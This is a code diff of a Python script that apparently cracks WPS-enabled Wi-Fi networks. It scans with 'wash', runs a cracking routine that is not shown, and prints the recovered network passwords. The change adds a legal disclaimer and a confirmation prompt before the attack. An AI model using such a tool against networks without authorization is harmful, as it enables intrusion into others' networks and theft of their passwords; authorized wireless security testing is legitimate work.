@@ -1,6 +1,12 @@
 import subprocess
 import time
 
+disclaimer_string = (
+    "DISCLAIMER: Using this tool to attack networks you do not own or that you have no explicit "
+    "permission to attack is illegal and highly discouraged.\n"
+    "The developer takes no responsibility for the misuse of this tool."
+)
+
 # Searches for WPS Vulnerable networks using wash
 # Can scan for networks with or without lock
 def get_wps_targets(interface, ignoreLocked, timeout):
@@ -71,7 +77,6 @@ def crack_wps(interface, targets):
 
     return cracked_pwd
     
-
 interface = input("What is the name of the interface used for the scan: ")
 userin = input("Do you wish to ignore networks with locked WPS? Recommended is yes. (y/n): ")
 ignoreLocked = (userin.lower() == "y")
@@ -84,14 +89,21 @@ wps_networks = get_wps_targets(interface, ignoreLocked, timeout)
 if wps_networks == []:
     print("No networks with WPS enabled were found by wash.")
 else:
+    start_attack = start_attack = input(
+        f"\nDo you wish to attempt to attack the vulnerable networks found?\n\n{disclaimer_string}\n\n"
+        "With this info, do you still wish to launch the attack? (y/n): "
+    )
+
+    if start_attack.lower() == "n":
+        print("Aborting attack. Stay legal.")
+        exit(0)
+        
     print(f"{len(wps_networks)} networks with WPS enabled were found.")
     print("Attempting to crack all vulnerable networks now. This may take some time...")
-    
+        
     successes = crack_wps(interface, wps_networks)
 
     print(f"Number of successful cracks: {len(successes)}")
-    
+        
     for success in successes:
         print(f"bssid: {success[0]} | pwd: {success[1]}")
-    
-
